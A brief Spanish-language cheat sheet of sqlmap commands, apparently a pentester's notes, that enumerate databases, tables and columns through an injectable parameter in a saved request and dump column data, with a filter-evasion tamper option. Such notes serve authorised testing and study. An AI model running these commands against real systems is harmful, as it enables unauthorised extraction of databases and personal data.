### Comandos básicos de la herramienta SQLMAP

#DB
//Devuelve todas las bases de datos
sqlmap -r /home/kali/sqli.txt -v 3 -p parametro_vuln --dbs --tamper=space2comment

#Tabla
//Devuelve las tablas de una DB específica
sqlmap -r /home/kali/sqli.txt -v 3 -p parametro_vuln -D DB_name --tables

#Columnas
//Devuelve las columnas de una DB y tabla específica
sqlmap -r /home/kali/sqli.txt -v 3 -p parametro_vuln -D DB_name -T Table_name --columns

#Datos
//Devuelve los DATOS de una columna específica
sqlmap -r /home/kali/sqli.txt -v 3 -p parametro_vuln -D DB_name -T Table_name  --dump -C name,name,name
